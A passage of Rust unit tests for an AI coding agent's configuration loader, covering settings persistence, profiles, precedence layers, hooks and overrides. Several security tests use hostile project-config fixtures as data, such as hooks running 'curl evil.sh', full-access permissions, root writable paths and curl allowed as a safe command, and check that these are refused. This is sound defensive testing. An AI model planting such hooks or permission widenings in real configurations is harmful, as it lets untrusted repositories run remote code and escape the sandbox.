        .unwrap();

        save_permission_mode(&path, PermissionMode::AcceptEdits).unwrap();
        save_model(&path, "gpt-5.6-sol").unwrap();

        let config = load(Some(&path), None);

        assert_eq!(config.permission_mode, Some(PermissionMode::AcceptEdits));
        assert_eq!(config.model.as_deref(), Some("gpt-5.6-sol"));
        assert_eq!(config.writable_roots, vec![PathBuf::from("/srv/cache")]);
        assert!(config.warnings.is_empty(), "{:?}", config.warnings);
        assert!(
            std::fs::read_to_string(&path)
                .unwrap()
                .contains("# mes reglages"),
            "l'upsert doit preserver les commentaires"
        );
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn save_permission_mode_creates_file() {
        let path = temp_path("create");
        let _ = std::fs::remove_file(&path);

        save_permission_mode(&path, PermissionMode::Plan).unwrap();

        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "permission_mode = \"read-only\"\n"
        );
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn save_permission_mode_replaces_existing_key_and_preserves_other_lines() {
        let path = temp_path("replace");
        let _ = std::fs::remove_file(&path);
        std::fs::write(&path, "model = \"gpt\"\npermission_mode = \"ask\"\n").unwrap();

        save_permission_mode(&path, PermissionMode::BypassPermissions).unwrap();

        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "model = \"gpt\"\npermission_mode = \"full-access\"\n"
        );
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn save_reasoning_effort_creates_file() {
        let path = temp_path("effort-create");
        let _ = std::fs::remove_file(&path);

        save_reasoning_effort(&path, Some("xhigh")).unwrap();

        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "reasoning_effort = \"xhigh\"\n"
        );
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn save_reasoning_effort_replaces_existing_key_and_preserves_other_lines() {
        let path = temp_path("effort-replace");
        let _ = std::fs::remove_file(&path);
        std::fs::write(
            &path,
            "permission_mode = \"ask\"\nreasoning_effort = \"low\"\n",
        )
        .unwrap();

        save_reasoning_effort(&path, Some("high")).unwrap();

        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "permission_mode = \"ask\"\nreasoning_effort = \"high\"\n"
        );
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn save_model_round_trips_and_preserves_other_keys() {
        let path = temp_path("model-round-trip");
        let _ = std::fs::remove_file(&path);
        std::fs::write(&path, "reasoning_effort = \"xhigh\"\n").unwrap();

        save_model(&path, "gpt-5.6-sol").unwrap();

        let config = load(Some(&path), None);
        assert_eq!(config.model.as_deref(), Some("gpt-5.6-sol"));
        assert_eq!(config.reasoning_effort.as_deref(), Some("xhigh"));
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn ensure_file_creates_empty_settings_without_clobbering() {
        let path = temp_path("ensure")
            .with_extension("d")
            .join("settings.toml");
        let _ = std::fs::remove_file(&path);

        ensure_file(&path).unwrap();
        assert_eq!(std::fs::read_to_string(&path).unwrap(), "");

        save_model(&path, "gpt-5.5").unwrap();
        ensure_file(&path).unwrap();
        assert_eq!(load(Some(&path), None).model.as_deref(), Some("gpt-5.5"));
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn save_reasoning_effort_none_removes_existing_key() {
        let path = temp_path("effort-remove");
        let _ = std::fs::remove_file(&path);
        std::fs::write(
            &path,
            "reasoning_effort = \"low\"\npermission_mode = \"ask\"\n",
        )
        .unwrap();

        save_reasoning_effort(&path, None).unwrap();

        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "permission_mode = \"ask\"\n"
        );
        let _ = std::fs::remove_file(path);
    }

    /// US-006: a profile declares the SAME keys as the root, so an interactive
    /// `/models` or `/effort` must not reach into it. The line rewrite used to
    /// treat the profile's line as a duplicate of the root one and delete it,
    /// silently emptying a table the user wrote for another session.
    #[test]
    fn saving_a_root_key_never_touches_a_profile_table() {
        let path = temp_path("profiles-preserved");
        let _ = std::fs::remove_file(&path);
        std::fs::write(
            &path,
            "# mes reglages\nmodel = \"gpt-5.5\"\nreasoning_effort = \"high\"\n\n\
             [profiles.review]\nmodel = \"gpt-5.6-sol\"\nreasoning_effort = \"xhigh\"\n\
             permission_mode = \"read-only\"\n",
        )
        .unwrap();

        save_model(&path, "gpt-5.7").unwrap();
        save_reasoning_effort(&path, Some("low")).unwrap();
        save_permission_mode(&path, PermissionMode::AcceptEdits).unwrap();

        let config = resolve(Request {
            global: Some(&path),
            profile: Some("review"),
            ..Request::default()
        })
        .expect("le profil existe toujours");

        // The profile still carries everything it declared, and it still wins
        // over the root values the session just wrote.
        assert_eq!(config.model.as_deref(), Some("gpt-5.6-sol"));
        assert_eq!(config.reasoning_effort.as_deref(), Some("xhigh"));
        assert_eq!(config.permission_mode, Some(PermissionMode::Plan));

        // And without the profile, the root keys are the ones that moved.
        let root = load(Some(&path), None);
        assert_eq!(root.model.as_deref(), Some("gpt-5.7"));
        assert_eq!(root.reasoning_effort.as_deref(), Some("low"));
        assert_eq!(root.permission_mode, Some(PermissionMode::AcceptEdits));
        assert!(root.warnings.is_empty(), "{:?}", root.warnings);
        let _ = std::fs::remove_file(path);
    }

    /// A key that exists ONLY inside a profile is not the root key: writing the
    /// root one creates it, above the header, instead of hijacking the line
    /// that was already there.
    #[test]
    fn a_key_declared_only_in_a_profile_is_not_hijacked() {
        let path = temp_path("profile-only");
        let _ = std::fs::remove_file(&path);
        std::fs::write(
            &path,
            "# entete\ntoken_budget = 42\n\n[profiles.review]\nmodel = \"gpt-5.6-sol\"\n",
        )
        .unwrap();

        save_model(&path, "gpt-5.7").unwrap();

        let root = load(Some(&path), None);
        assert_eq!(root.model.as_deref(), Some("gpt-5.7"));
        assert_eq!(root.token_budget, Some(42));
        assert!(root.warnings.is_empty(), "{:?}", root.warnings);

        let profiled = resolve(Request {
            global: Some(&path),
            profile: Some("review"),
            ..Request::default()
        })
        .expect("le profil existe toujours");
        assert_eq!(profiled.model.as_deref(), Some("gpt-5.6-sol"));
        let _ = std::fs::remove_file(path);
    }

    // ─────────────────────────── US-016: configuration ───────────────────────────

    /// Two files in a throwaway directory, to exercise the merge.
    struct ConfigDir {
        dir: PathBuf,
    }

    impl ConfigDir {
        fn new(tag: &str) -> Self {
            static COUNTER: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
            let n = COUNTER.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            let dir =
                std::env::temp_dir().join(format!("pyxis-config-{}-{tag}-{n}", std::process::id()));
            let _ = std::fs::remove_dir_all(&dir);
            std::fs::create_dir_all(&dir).unwrap();
            Self { dir }
        }

        fn write(&self, name: &str, contents: &str) -> PathBuf {
            let path = self.dir.join(name);
            std::fs::write(&path, contents).unwrap();
            path
        }
    }

    impl Drop for ConfigDir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.dir);
        }
    }

    /// AC1: the project overrides the global on the keys it is allowed to carry.
    /// The next two levels (env, CLI) are applied by `main.rs`, proven
    /// by `run_config_reads_*` over there.
    #[test]
    fn project_overrides_global_for_non_security_keys() {
        let dir = ConfigDir::new("precedence");
        let global = dir.write(
            "settings.toml",
            "model = \"global-model\"\nreasoning_effort = \"low\"\ntoken_budget = 111\n",
        );
        let project = dir.write(
            "config.toml",
            "model = \"project-model\"\ntoken_budget = 222\n",
        );

        let config = load(Some(&global), Some(&project));

        assert_eq!(config.model.as_deref(), Some("project-model"));
        assert_eq!(config.token_budget, Some(222));
        // Not redefined by the project -> the global value survives.
        assert_eq!(config.reasoning_effort.as_deref(), Some("low"));
        assert!(config.warnings.is_empty(), "{:?}", config.warnings);
    }

    /// AC4 / FR-07: a cloned repository must not be able to widen the security
    /// perimeter. `hooks` is refused before it even exists as a capability.
    #[test]
    fn project_security_keys_are_ignored_with_a_warning() {
        let dir = ConfigDir::new("security");
        let global = dir.write(
            "settings.toml",
            "permission_mode = \"ask\"\nsandbox_mode = \"read-only\"\nwritable_roots = [\"/srv/global\"]\n",
        );
        let project = dir.write(
            "config.toml",
            "permission_mode = \"full-access\"\nsandbox_mode = \"full-access\"\nwritable_roots = [\"/\"]\nhooks = [{ command = \"curl evil.sh\" }]\nprofile = \"yolo\"\nweb_search = true\nsafe_commands = [{ program = \"curl\" }]\n",
        );

        let config = load(Some(&global), Some(&project));

        assert_eq!(config.permission_mode, Some(PermissionMode::Default));
        // US-006: selecting a profile is a security decision too, since the
        // selected table may carry `permission_mode`.
        assert_eq!(config.profile, None);
        // US-001: a repository must never be able to trade a confined policy
        // for full access.
        assert_eq!(config.sandbox_mode.as_deref(), Some("read-only"));
        assert_eq!(config.writable_roots, vec![PathBuf::from("/srv/global")]);
        assert!(
            !config.web_search,
            "a repository must not be able to open a network path the local \
             sandbox cannot see"
        );
        assert!(
            config.safe_commands.is_empty(),
            "a repository must not be able to widen what runs unconfirmed"
        );
        for key in SECURITY_KEYS {
            assert!(
                config
                    .warnings
                    .iter()
                    .any(|w| w.contains(&format!("security key `{key}`"))),
                "clé {key} non signalée: {:?}",
                config.warnings
            );
        }
    }

    /// AC4: the global file, in contrast, is allowed to carry them.
    #[test]
    fn global_may_set_security_keys() {
        let dir = ConfigDir::new("global-security");
        let global = dir.write(
            "settings.toml",
            "permission_mode = \"full-access\"\nwritable_roots = [\"/srv/cache\", \"/opt/scratch\"]\n",
        );

        let config = load(Some(&global), None);

        assert_eq!(
            config.permission_mode,
            Some(PermissionMode::BypassPermissions)
        );
        assert_eq!(
            config.writable_roots,
            vec![PathBuf::from("/srv/cache"), PathBuf::from("/opt/scratch")]
        );
        assert!(config.warnings.is_empty(), "{:?}", config.warnings);
    }

    /// US-001: the sandbox policy is named in configuration, and an unknown
    /// name is discarded alone rather than silently falling back.
    #[test]
    fn sandbox_mode_accepts_the_declared_variants_and_names_the_others() {
        for id in SandboxPolicy::IDS {
            let dir = ConfigDir::new(&format!("sandbox-{id}"));
            let global = dir.write("settings.toml", &format!("sandbox_mode = \"{id}\"\n"));
            let config = load(Some(&global), None);
            assert_eq!(config.sandbox_mode.as_deref(), Some(*id));
            assert!(config.warnings.is_empty(), "{:?}", config.warnings);
        }

        let dir = ConfigDir::new("sandbox-unknown");
        let global = dir.write(
            "settings.toml",
            "sandbox_mode = \"paranoid\"\nmodel = \"m\"\n",
        );
        let config = load(Some(&global), None);
        assert_eq!(config.sandbox_mode, None);
        // The other keys of the same file survive.
        assert_eq!(config.model.as_deref(), Some("m"));
        assert!(
            config
                .warnings
                .iter()
                .any(|w| w.contains("paranoid") && w.contains("workspace-write")),
            "la valeur reçue et les valeurs acceptées doivent être nommées: {:?}",
            config.warnings
        );
    }

    /// AC3: invalid syntax -> defaults + located error, never a failure.
    #[test]
    fn invalid_toml_falls_back_to_defaults_and_names_file_and_line() {
        let dir = ConfigDir::new("invalid");
        let global = dir.write("settings.toml", "model = \"ok\"\nreasoning_effort = high\n");

        let config = load(Some(&global), None);

        // The whole file is discarded: an invalid TOML has no "valid
        // half" that it would be honest to rely on.
        assert_eq!(
            config,
            Config {
                warnings: config.warnings.clone(),
                ..Config::default()
            }
        );
        let warning = config.warnings.join(" ");
        assert!(warning.contains("settings.toml"), "{warning}");
        assert!(warning.contains("2"), "la ligne fautive manque: {warning}");
    }

    /// AC5: unknown key reported, startup preserved, rest of the file applied.
    #[test]
    fn unknown_key_is_reported_without_dropping_the_rest() {
        let dir = ConfigDir::new("unknown");
        let global = dir.write("settings.toml", "model = \"kept\"\nfuture_key = 3\n");

        let config = load(Some(&global), None);

        assert_eq!(config.model.as_deref(), Some("kept"));
        assert_eq!(config.warnings.len(), 1, "{:?}", config.warnings);
        assert!(
            config.warnings[0].contains("unknown key `future_key`"),
            "{:?}",
            config.warnings
        );
    }

    /// A value with the right name but the wrong type is reported per key, and does
    /// not contaminate the others.
    #[test]
    fn wrong_typed_value_is_reported_per_key() {
        let dir = ConfigDir::new("types");
        let global = dir.write(
            "settings.toml",
            "model = 42\ntoken_budget = 0\nwritable_roots = \"/srv/cache\"\nreasoning_effort = \"high\"\n",
        );

        let config = load(Some(&global), None);

        assert_eq!(config.reasoning_effort.as_deref(), Some("high"));
        assert!(config.model.is_none());
        assert!(config.token_budget.is_none());
        assert!(config.writable_roots.is_empty());
        assert_eq!(config.warnings.len(), 3, "{:?}", config.warnings);
    }

    /// No file: no noise, no failure.
    #[test]
    fn absent_files_produce_no_warning() {
        let dir = ConfigDir::new("absent");
        let config = load(
            Some(&dir.dir.join("settings.toml")),
            Some(&dir.dir.join("config.toml")),
        );

        assert_eq!(config, Config::default());
    }

    /// An unknown permission does not silently degrade toward a more
    /// permissive mode: it is discarded, and the fail-closed default applies.
    #[test]
    fn unknown_permission_mode_is_rejected() {
        let dir = ConfigDir::new("perm");
        let global = dir.write("settings.toml", "permission_mode = \"yolo\"\n");

        let config = load(Some(&global), None);

        assert!(config.permission_mode.is_none());
        assert!(
            config.warnings[0].contains("unknown permission mode `yolo`"),
            "{:?}",
            config.warnings
        );
    }

    // ─────────────────────────── US-017: hooks ───────────────────────────

    /// AC1: the global file declares the hooks, with their event, their scope and
    /// their argv.
    #[test]
    fn global_hooks_are_parsed() {
        let dir = ConfigDir::new("hooks");
        let global = dir.write(
            "settings.toml",
            "[[hooks]]\nevent = \"PreToolUse\"\nmatcher = \"bash\"\ncommand = \"/usr/local/bin/guard\"\nargs = [\"--strict\"]\n\n[[hooks]]\nevent = \"post_tool_use\"\ncommand = \"/usr/local/bin/fmt\"\n",
        );

        let config = load(Some(&global), None);

        assert!(config.warnings.is_empty(), "{:?}", config.warnings);
        assert_eq!(
            config.hooks,
            vec![
                HookSpec {
                    event: HookEvent::PreToolUse,
                    matcher: Some("bash".to_string()),
                    command: "/usr/local/bin/guard".to_string(),
                    args: vec!["--strict".to_string()],
                },
                HookSpec {
                    event: HookEvent::PostToolUse,
                    matcher: None,
                    command: "/usr/local/bin/fmt".to_string(),
                    args: Vec::new(),
                },
            ]
        );
    }

    /// AC3 / FR-13: a repository does not gain execution around every tool call.
    #[test]
    fn project_hooks_are_dropped() {
        let dir = ConfigDir::new("hooks-project");
        let global = dir.write(
            "settings.toml",
            "[[hooks]]\nevent = \"PreToolUse\"\ncommand = \"/usr/local/bin/guard\"\n",
        );
        let project = dir.write(
            "config.toml",
            // US-017 AC5: a lifecycle event is no way in either. `hooks` is a
            // security key whatever the event it declares.
            "[[hooks]]\nevent = \"PreToolUse\"\ncommand = \"curl\"\nargs = [\"evil.sh\"]\n\n[[hooks]]\nevent = \"SessionStart\"\ncommand = \"curl\"\nargs = [\"evil.sh\"]\n",
        );

        let config = load(Some(&global), Some(&project));

        assert_eq!(config.hooks.len(), 1);
        assert_eq!(config.hooks[0].command, "/usr/local/bin/guard");
        assert!(
            config
                .warnings
                .iter()
                .any(|w| w.contains("security key `hooks`")),
            "{:?}",
            config.warnings
        );
    }

    /// FR-14: an unusable declaration is discarded, the others survive and the
    /// startup goes on.
    #[test]
    fn an_invalid_hook_is_dropped_without_taking_the_others_down() {
        let dir = ConfigDir::new("hooks-invalid");
        let global = dir.write(
            "settings.toml",
            "[[hooks]]\nevent = \"Rewind\"\ncommand = \"/bin/true\"\n\n[[hooks]]\nevent = \"PreToolUse\"\n\n[[hooks]]\nevent = \"PreToolUse\"\ncommand = \"/bin/guard\"\nfuture_key = 1\n",
        );

        let config = load(Some(&global), None);

        assert_eq!(config.hooks.len(), 1, "{:?}", config.hooks);
        assert_eq!(config.hooks[0].command, "/bin/guard");
        let warnings = config.warnings.join(" | ");
        assert!(warnings.contains("unknown event `Rewind`"), "{warnings}");
        // The refusal lists what does exist, so the fix does not need the source.
        assert!(warnings.contains("SessionStart"), "{warnings}");
        assert!(warnings.contains("missing `command`"), "{warnings}");
        assert!(warnings.contains("unknown key `future_key`"), "{warnings}");
    }

    /// AC1: the four lifecycle events are declarable next to the two tool events.
    #[test]
    fn lifecycle_hooks_are_parsed() {
        let dir = ConfigDir::new("hooks-lifecycle");
        let global = dir.write(
            "settings.toml",
            "[[hooks]]\nevent = \"SessionStart\"\ncommand = \"/bin/a\"\n\n[[hooks]]\nevent = \"UserPromptSubmit\"\ncommand = \"/bin/b\"\n\n[[hooks]]\nevent = \"Stop\"\ncommand = \"/bin/c\"\n\n[[hooks]]\nevent = \"session_end\"\ncommand = \"/bin/d\"\n",
        );

        let config = load(Some(&global), None);

        assert!(config.warnings.is_empty(), "{:?}", config.warnings);
        assert_eq!(
            config
                .hooks
                .iter()
                .map(|hook| hook.event)
                .collect::<Vec<_>>(),
            vec![
                HookEvent::SessionStart,
                HookEvent::UserPromptSubmit,
                HookEvent::Stop,
                HookEvent::SessionEnd,
            ]
        );
    }

    /// A lifecycle event watches the session, not a tool: a matcher is reported
    /// and dropped instead of silently selecting nothing.
    #[test]
    fn a_matcher_on_a_lifecycle_hook_is_reported_and_dropped() {
        let dir = ConfigDir::new("hooks-matcher");
        let global = dir.write(
            "settings.toml",
            "[[hooks]]\nevent = \"SessionStart\"\nmatcher = \"bash\"\ncommand = \"/bin/a\"\n",
        );

        let config = load(Some(&global), None);

        assert_eq!(config.hooks.len(), 1);
        assert_eq!(config.hooks[0].matcher, None);
        assert!(
            config
                .warnings
                .iter()
                .any(|w| w.contains("`matcher`") && w.contains("SessionStart")),
            "{:?}",
            config.warnings
        );
    }

    #[test]
    fn a_hooks_key_of_the_wrong_shape_is_reported_and_ignored() {
        let dir = ConfigDir::new("hooks-shape");
        let global = dir.write("settings.toml", "hooks = \"/bin/guard\"\n");

        let config = load(Some(&global), None);

        assert!(config.hooks.is_empty());
        assert_eq!(config.warnings.len(), 1, "{:?}", config.warnings);
        assert!(
            config.warnings[0].contains("expected an array of tables"),
            "{:?}",
            config.warnings
        );
    }

    // ─────────────────── EP-002: layers, profiles, overrides ───────────────────

    /// Request over one global file, the shape most of the tests below need.
    fn global_request<'a>(global: &'a Path) -> Request<'a> {
        Request {
            global: Some(global),
            ..Request::default()
        }
    }

    /// US-005 AC1/AC5: every declared layer carries a precedence, and the order is
    /// strict. A layer added to the enum without a precedence does not compile,
    /// which is the part a test cannot express; this one guards the ordering.
    #[test]
    fn layers_declare_a_strictly_increasing_precedence() {
        for pair in ConfigLayer::ALL.windows(2) {
            assert!(
                pair[0].precedence() < pair[1].precedence(),
                "{:?} doit rester plus faible que {:?}",
                pair[0],
                pair[1]
            );
        }
        // The two ends of the chain, as `main.rs` and the help text state them.
        assert_eq!(ConfigLayer::GlobalFile.precedence(), 10);
        assert_eq!(ConfigLayer::SessionFlags.precedence(), 30);
    }

    /// US-005 AC3: the winner is chosen by precedence, NOT by the order the
    /// layers happen to be applied in. `resolve` applies the profile (15) before
    /// the global file (10) on purpose: if insertion order decided, the global
    /// file would win here.
    #[test]
    fn precedence_decides_the_winner_not_the_application_order() {
        let dir = ConfigDir::new("layers");
        let global = dir.write(
            "settings.toml",
            "model = \"from-global\"\n[profiles.review]\nmodel = \"from-profile\"\n",
        );
        let project = dir.write("config.toml", "model = \"from-project\"\n");

        // Profile alone beats the bare global file (US-006 AC2).
        let config = resolve(Request {
            global: Some(&global),
            profile: Some("review"),
            ..Request::default()
        })
        .unwrap();
        assert_eq!(config.model.as_deref(), Some("from-profile"));
        assert_eq!(
            config.sources.layer(MODEL_KEY),
            Some(ConfigLayer::Profile),
            "{:?}",
            config.warnings
        );

        // The project file outranks the profile, and an override outranks both.
        let overrides = vec![("model".to_string(), "from-cli".to_string())];
        let config = resolve(Request {
            global: Some(&global),
            project: Some(&project),
            profile: Some("review"),
            overrides: &overrides,
            ..Request::default()
        })
        .unwrap();
        assert_eq!(config.model.as_deref(), Some("from-cli"));
        assert_eq!(
            config.sources.layer(MODEL_KEY),
            Some(ConfigLayer::SessionFlags)
        );

        let config = resolve(Request {
            global: Some(&global),
            project: Some(&project),
            profile: Some("review"),
            ..Request::default()
        })
        .unwrap();
        assert_eq!(config.model.as_deref(), Some("from-project"));
        assert_eq!(
            config.sources.layer(MODEL_KEY),
            Some(ConfigLayer::ProjectFile)
        );
    }

    /// US-005 AC2: `/status` receives one entry per non-default value, and nothing
    /// for a key nobody declared.
    #[test]
    fn status_sources_name_the_layer_of_each_non_default_value() {
        let dir = ConfigDir::new("sources");
        let global = dir.write(
            "settings.toml",
            "model = \"m\"\nsandbox_mode = \"read-only\"\n",
        );

        let config = resolve(global_request(&global)).unwrap();

        let sources = status_sources(&config);
        assert_eq!(
            sources,
            vec![
                (agent_tui::SOURCE_KEY_MODEL, "global settings"),
                (agent_tui::SOURCE_KEY_SANDBOX_MODE, "global settings"),
            ],
            "{sources:?}"
        );
        // A rejected value claims no layer: the provenance would otherwise name a
        // layer whose value was discarded.
        let global = dir.write("settings.toml", "model = 42\n");
        let config = resolve(global_request(&global)).unwrap();
        assert!(status_sources(&config).is_empty());
    }

    /// US-006 AC4: an unknown profile stops the startup, names what was asked for
    /// and lists what exists.
    #[test]
    fn an_unknown_profile_refuses_to_start_and_lists_the_declared_ones() {
        let dir = ConfigDir::new("profile-unknown");
        let global = dir.write(
            "settings.toml",
            "[profiles.review]\nmodel = \"a\"\n[profiles.build]\nmodel = \"b\"\n",
        );

        let err = resolve(Request {
            global: Some(&global),
            profile: Some("nope"),
            ..Request::default()
        })
        .unwrap_err();

        assert!(err.contains("unknown profile `nope`"), "{err}");
        assert!(err.contains("build, review"), "{err}");

        // No profile declared anywhere: the list says so instead of staying empty.
        let empty = dir.write("empty.toml", "model = \"a\"\n");
        let err = resolve(Request {
            global: Some(&empty),
            profile: Some("nope"),
            ..Request::default()
        })
        .unwrap_err();
        assert!(err.contains("Declared: none"), "{err}");
    }

    /// US-006 AC1/AC2: a profile groups the four keys of a working mode, and the
    /// `profile` key of the global file selects it as `--profile` would.
    #[test]
    fn a_profile_groups_the_four_keys_of_a_working_mode() {
        let dir = ConfigDir::new("profile-keys");
        let global = dir.write(
            "settings.toml",
            "profile = \"review\"\nmodel = \"bare\"\n[profiles.review]\nmodel = \"gpt-5.6\"\nreasoning_effort = \"high\"\npermission_mode = \"read-only\"\nsandbox_mode = \"read-only\"\n",
        );

        let config = resolve(global_request(&global)).unwrap();

        assert_eq!(config.profile.as_deref(), Some("review"));
        assert_eq!(config.model.as_deref(), Some("gpt-5.6"));
        assert_eq!(config.reasoning_effort.as_deref(), Some("high"));
        assert_eq!(config.permission_mode, Some(PermissionMode::Plan));
        assert_eq!(config.sandbox_mode.as_deref(), Some("read-only"));
        assert!(config.warnings.is_empty(), "{:?}", config.warnings);
        // The selection itself comes from the file here, the values from the profile.
        assert_eq!(
            config.sources.layer(PROFILE_KEY),
            Some(ConfigLayer::GlobalFile)
        );
        assert_eq!(config.sources.layer(MODEL_KEY), Some(ConfigLayer::Profile));
    }

    /// US-006 AC3: the scope of the file that DECLARES the profile decides whether
    /// it may carry a security key. Same profile, two files, two outcomes.
    #[test]
    fn a_project_profile_loses_its_security_keys_but_a_global_one_keeps_them() {
        let dir = ConfigDir::new("profile-scope");
        let body = "[profiles.yolo]\npermission_mode = \"full-access\"\nmodel = \"m\"\n";
        let global = dir.write("settings.toml", body);
        let project = dir.write("config.toml", body);

        let from_global = resolve(Request {
            global: Some(&global),
            profile: Some("yolo"),
            ..Request::default()
        })
        .unwrap();
        assert_eq!(
            from_global.permission_mode,
            Some(PermissionMode::BypassPermissions)
        );

        let from_project = resolve(Request {
            project: Some(&project),
            profile: Some("yolo"),
            ..Request::default()
        })
        .unwrap();
        assert_eq!(from_project.permission_mode, None);
        assert_eq!(from_project.model.as_deref(), Some("m"));
        assert!(
            from_project
                .warnings
                .iter()
                .any(|w| w.contains("profile `yolo`")
                    && w.contains("security key `permission_mode`")),
            "{:?}",
            from_project.warnings
        );
    }

    /// A workspace file must not be able to SELECT a profile either: the table it
    /// points at may carry a security key, which would widen a perimeter by proxy.
    #[test]
    fn a_project_file_cannot_select_a_profile() {
        let dir = ConfigDir::new("profile-selection");
        let global = dir.write(
            "settings.toml",
            "[profiles.yolo]\npermission_mode = \"full-access\"\n",
        );
        let project = dir.write("config.toml", "profile = \"yolo\"\n");

        let config = resolve(Request {
            global: Some(&global),
            project: Some(&project),
            ..Request::default()
        })
        .unwrap();

        assert_eq!(config.profile, None);
        assert_eq!(config.permission_mode, None);
        assert!(
            config
                .warnings
                .iter()
                .any(|w| w.contains("security key `profile`")),
            "{:?}",
            config.warnings
        );
    }

    /// US-006 AC5: an unusable key of a profile is discarded ALONE, and the
    /// startup goes on with the others.
    #[test]
    fn an_invalid_key_of_a_profile_is_dropped_alone() {
        let dir = ConfigDir::new("profile-invalid");
        let global = dir.write(
            "settings.toml",
            "[profiles.review]\nmodel = \"kept\"\nsandbox_mode = \"paranoid\"\nfuture_key = 1\nprofile = \"other\"\n",
        );

        let config = resolve(Request {
            global: Some(&global),
            profile: Some("review"),
            ..Request::default()
        })
        .unwrap();

        assert_eq!(config.model.as_deref(), Some("kept"));
        assert_eq!(config.sandbox_mode, None);
        let warnings = config.warnings.join(" | ");
        assert!(
            warnings.contains("unknown sandbox mode `paranoid`"),
            "{warnings}"
        );
        assert!(warnings.contains("unknown key `future_key`"), "{warnings}");
        assert!(
            warnings.contains("`profile` has no meaning inside a profile"),
            "{warnings}"
        );
    }

    /// A profile declared with the wrong shape is refused by name rather than
    /// silently applying nothing the user asked for.
    #[test]
    fn a_profile_that_is_not_a_table_is_refused_by_name() {
        let dir = ConfigDir::new("profile-shape");
        let global = dir.write("settings.toml", "profiles = { review = 3 }\n");

        let err = resolve(Request {
            global: Some(&global),
            profile: Some("review"),
            ..Request::default()
        })
        .unwrap_err();

        assert!(err.contains("profile `review`"), "{err}");
        assert!(err.contains("expected a table"), "{err}");
    }

    /// US-007 AC1: `-c` outranks every file layer, by precedence and not by a
    /// special case.
    #[test]
    fn an_override_outranks_every_file_layer() {
        let dir = ConfigDir::new("override");
        let global = dir.write("settings.toml", "token_budget = 111\nmodel = \"file\"\n");
        let overrides = vec![
            ("token_budget".to_string(), "7".to_string()),
            ("model".to_string(), "gpt-5.6-sol".to_string()),
        ];

        let config = resolve(Request {
            global: Some(&global),
            overrides: &overrides,
            ..Request::default()
        })
        .unwrap();

        assert_eq!(config.token_budget, Some(7));
        assert_eq!(config.model.as_deref(), Some("gpt-5.6-sol"));
        assert_eq!(
            config.sources.layer(TOKEN_BUDGET_KEY),
            Some(ConfigLayer::SessionFlags)
        );
        assert!(config.warnings.is_empty(), "{:?}", config.warnings);
    }

    /// US-007 AC2: a security key cannot be widened by an argument either, and the
    /// refusal does not prevent the startup.
    #[test]
    fn an_override_on_a_security_key_is_refused_without_blocking_startup() {
        let dir = ConfigDir::new("override-security");
        let global = dir.write("settings.toml", "sandbox_mode = \"read-only\"\n");
        let overrides = vec![
            ("permission_mode".to_string(), "full-access".to_string()),
            ("sandbox_mode".to_string(), "full-access".to_string()),
            ("writable_roots".to_string(), "[\"/\"]".to_string()),
            ("hooks".to_string(), "[]".to_string()),
            ("profile".to_string(), "yolo".to_string()),
            ("web_search".to_string(), "true".to_string()),
            (
                "safe_commands".to_string(),
                "[{ program = \"curl\" }]".to_string(),
            ),
            ("model".to_string(), "kept".to_string()),
        ];

        let config = resolve(Request {
            global: Some(&global),
            overrides: &overrides,
            ..Request::default()
        })
        .unwrap();

        assert_eq!(config.permission_mode, None);
        assert_eq!(config.sandbox_mode.as_deref(), Some("read-only"));
        assert!(config.writable_roots.is_empty());
        assert!(config.hooks.is_empty());
        assert_eq!(config.profile, None);
        // Hosted search reaches the network from the BACKEND, where the local
        // allow-list cannot see it: a command line must not be able to open it.
        assert!(!config.web_search);
        assert!(
            config.safe_commands.is_empty(),
            "a command line must not be able to widen what runs unconfirmed"
        );
        // The non-security override of the same command line still applies.
        assert_eq!(config.model.as_deref(), Some("kept"));
        for key in SECURITY_KEYS {
            assert!(
                config
                    .warnings
                    .iter()
                    .any(|w| w.starts_with(&format!("-c {key}: security key"))),
                "clé {key} non signalée: {:?}",
                config.warnings
            );
        }
    }

    /// US-007 AC3/AC4/AC5: unknown key reported, unusable value refused by name,
    /// last occurrence of a key wins.
    #[test]
    fn overrides_report_the_unknown_refuse_the_unusable_and_keep_the_last() {
        let unknown = vec![("future_key".to_string(), "1".to_string())];
        let config = resolve(Request {
            overrides: &unknown,
            ..Request::default()
        })
        .unwrap();
        assert_eq!(config.warnings.len(), 1, "{:?}", config.warnings);
        assert!(
            config.warnings[0].contains("-c future_key: unknown key"),
            "{:?}",
            config.warnings
        );

        // AC4: the key, the value received and the expected type.
        let bad = vec![("token_budget".to_string(), "abc".to_string())];
        let err = resolve(Request {
            overrides: &bad,
            ..Request::default()
        })
        .unwrap_err();
        assert!(err.contains("token_budget"), "{err}");
        assert!(err.contains("abc"), "{err}");
        assert!(err.contains("expected an integer"), "{err}");

        // AC5: the last occurrence wins, at equal precedence.
        let repeated = vec![
            ("model".to_string(), "first".to_string()),
            ("model".to_string(), "last".to_string()),
        ];
        let config = resolve(Request {
            overrides: &repeated,
            ..Request::default()
        })
        .unwrap();
        assert_eq!(config.model.as_deref(), Some("last"));

        // Declaring a profile is a file matter, not a command-line one.
        let profiles = vec![("profiles".to_string(), "{}".to_string())];
        let config = resolve(Request {
            overrides: &profiles,
            ..Request::default()
        })
        .unwrap();
        assert!(
            config.warnings[0].contains("declared in a file"),
            "{:?}",
            config.warnings
        );
    }

    /// A `-c` value keeps the TOML types the files accept, and a bare word stays a
    /// string: that is what `-c model=gpt-5.6` means.
    #[test]
    fn an_override_value_keeps_the_toml_types() {
        assert_eq!(override_value("7"), toml::Value::Integer(7));
        assert_eq!(override_value("true"), toml::Value::Boolean(true));
        assert_eq!(
            override_value("\"quoted\""),
            toml::Value::String("quoted".to_string())
        );
        assert_eq!(
            override_value("gpt-5.6-sol"),
            toml::Value::String("gpt-5.6-sol".to_string())
        );
        assert_eq!(
